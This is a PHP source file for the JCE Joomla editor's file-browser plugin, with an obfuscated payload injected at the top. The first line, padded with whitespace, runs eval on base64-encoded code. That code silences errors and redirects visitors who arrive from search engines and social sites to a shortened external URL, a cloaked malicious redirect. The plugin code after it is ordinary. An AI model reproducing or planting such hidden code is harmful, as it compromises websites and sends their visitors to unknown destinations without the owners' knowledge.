<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
* @version		$Id: browser.php 46 2009-05-26 16:59:42Z happynoodleboy $
* @package      JCE
* @copyright    Copyright (C) 2005 - 2009 Ryan Demmer. All rights reserved.
* @author		Ryan Demmer
* @license      GNU/GPL
* JCE is free software. This version may have been modified pursuant
* to the GNU General Public License, and as distributed it includes or
* is derivative of works licensed under the GNU General Public License or
* other free or open source software licenses.
*/
 
require_once(JCE_LIBRARIES .DS. 'classes' .DS. 'manager.php');

class Browser extends Manager
{
	/* 
	* @var string
	*/
	var $_ext = 'xml=xml;html=htm,html;word=doc,docx;powerpoint=ppt;excel=xls;text=txt,rtf;image=gif,jpeg,jpg,png;acrobat=pdf;archive=zip,tar,gz;flash=swf;winrar=rar;quicktime=mov,mp4,qt;windowsmedia=wmv,asx,asf,avi;audio=wav,mp3,aiff;openoffice=odt,odg,odp,ods,odf';	
	
	/**
	* @access	protected
	*/
	function __construct()
	{		
		// Call parent
		parent::__construct();
		if(JRequest::getVar('type', 'file') == 'file'){
			$this->setFileTypes($this->getPluginParam('browser_extensions', $this->_ext));
		}else{
			$this->setFileTypes('image=jpg,jpeg,png,gif');
		}		
		$this->init();
	}
	/**
	 * Returns a reference to a editor object
	 *
	 * This method must be invoked as:
	 * 		<pre>  $browser = &Browser::getInstance();</pre>
	 *
	 * @access	public
	 * @return	JCE  The editor object.
	 * @since	1.5
	 */
	function &getInstance()
	{
		static $instance;

		if (!is_object($instance)) {
			$instance = new Browser();
		}
		return $instance;
	}
	/**
	 * Initialise the plugin
	 */
	function init()
	{
		$this->checkPlugin() or die('Restricted access');
		
		parent::init();

		// Set javascript file array
		$this->script(array(
			'browser'
		), 'plugins');
		$this->css(array(
			'browser'
		), 'plugins');		
		$this->loadExtensions();
	}
	/**
	 * Get viewable file types
	 * @return string Comma seperated list of file extensions
	 */
	function getViewable()
	{
		return $this->getPluginParam('browser_extensions_viewable', 'html,htm,doc,docx,ppt,rtf,xls,txt,gif,jpeg,jpg,png,pdf,swf,mov,mpeg,mpg,avi,asf,asx,dcr,flv,wmv,wav,mp3');
	}
}
?>